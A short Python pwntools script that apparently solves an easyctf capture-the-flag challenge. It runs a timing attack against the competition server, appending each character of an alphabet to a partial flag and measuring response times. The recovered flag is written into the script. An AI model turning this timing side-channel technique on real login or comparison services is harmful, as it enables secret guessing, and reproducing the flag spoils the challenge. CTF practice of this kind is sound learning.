from pwn import *
import socket
from datetime import datetime

alphabet = "}{_abcdefghijklmnopqrstuvwxyz0123456789"

flag = "easyctf{ez_t1m1ng_4ttack!}"


#prev_time = 


def test(string):
	r = remote('c1.easyctf.com', 12482)
	#r.send("easy\n")
	garbage = r.recv()
	startTime = datetime.now()
	r.send(string + "\n")
	answer = r.recv()
	time = (datetime.now() - startTime).total_seconds()
	return time

for i in alphabet:
	print(i,test(flag + str(i)))

#print r.recvuntil("END\n")
#interactive mode
#r.interactive()

#clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#clientsocket.connect(('c1.easyctf.com', 12482))
#clientsocket.send('easy')

#print(clientsocket.recv(4096))
#print("h")
#clientsocket.send('blabla')
#print(clientsocket.recv(4096))